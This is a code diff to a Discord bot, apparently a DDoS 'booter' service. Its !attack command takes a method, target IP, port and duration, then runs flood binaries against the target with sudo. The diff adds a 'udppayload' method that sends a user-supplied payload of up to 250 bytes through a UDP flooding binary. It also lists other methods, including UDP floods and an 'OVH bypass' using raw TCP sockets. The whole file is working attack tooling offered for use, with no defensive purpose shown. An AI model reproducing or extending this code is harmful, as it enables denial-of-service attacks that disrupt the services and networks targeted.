@@ -41,9 +41,9 @@ async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int):
             pass
 
 @bot.command(name='attack', help='!attack {method} {ip} {port} {time}')
-async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiempo: str = None):
+async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiempo: str = None, *, payload: str = None):
     if metodo is None or ip is None or port is None or tiempo is None:
-        await ctx.send("!attack {method} {ip} {port} {time} 2")
+        await ctx.send("Uso: !attack {method} {ip} {port} {time}")
         return
 
     if ip == "null" or port == "null" or tiempo == "null":
@@ -85,8 +85,33 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
         comando = f'sudo ./ovh {ip} {port_int} 20 -1 {tiempo_int}'
         await ctx.send(f'Successful Attack OVH TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
     
+    elif metodo == 'udppayload':
+        if payload is None or payload == "null":
+            await ctx.send("Falta el payload")
+            return
+        
+        if len(payload) > 250:
+            await ctx.send("Payload maximo 250 bytes")
+            return
+        
+        # Escapar comillas para bash
+        payload_escaped = payload.replace('"', '\\"').replace('$', '\\$').replace('`', '\\`')
+        
+        # Guardar payload en archivo temporal
+        import tempfile
+        import os
+        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
+            f.write(payload)
+            temp_file = f.name
+        
+        # El binario C leerá el archivo
+        comando = f'./udppayload {ip} {port_int} {tiempo_int} "{temp_file}"'
+        
+        # Mostrar info breve
+        await ctx.send(f'Successful Attack UDPPayload TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int} Payload:{len(payload)}')
+    
     else:
-        await ctx.send('Métodos: udp, udphex, udppps, udpflood, ovh')
+        await ctx.send('Métodos: udp, udphex, udppps, udpflood, ovh, udppayload')
         return
 
     try:
@@ -103,6 +128,7 @@ async def show_methods(ctx):
 • **udppps** - UDPpps, the best power
 • **udpflood** - udpflood con threads
 • **ovh** - OVH bypass (TCP raw sockets)
+• **udppayload** - payload personalizable (max 250bytes)
 """
     await ctx.send(methods_info)
 
